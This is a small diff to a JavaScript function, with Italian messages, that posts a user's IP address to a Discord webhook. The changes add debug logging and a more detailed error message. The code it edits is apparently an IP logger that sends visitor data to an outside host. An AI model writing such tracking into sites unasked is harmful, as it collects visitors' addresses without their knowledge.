@@ -19,6 +19,8 @@ function sendToDiscord(ip) {
         content: `L'indirizzo IP dell'utente è: ${ip}`
     };
 
+    console.log('Sending message to Discord:', message);
+
     fetch(webhookUrl, {
         method: 'POST',
         headers: {
@@ -30,7 +32,7 @@ function sendToDiscord(ip) {
         if (response.ok) {
             console.log('Messaggio inviato al bot di Discord');
         } else {
-            console.error('Errore nell\'invio del messaggio al bot di Discord');
+            console.error('Errore nell\'invio del messaggio al bot di Discord:', response.statusText);
         }
     })
     .catch(error => console.error('Errore nella richiesta alla webhook di Discord:', error));
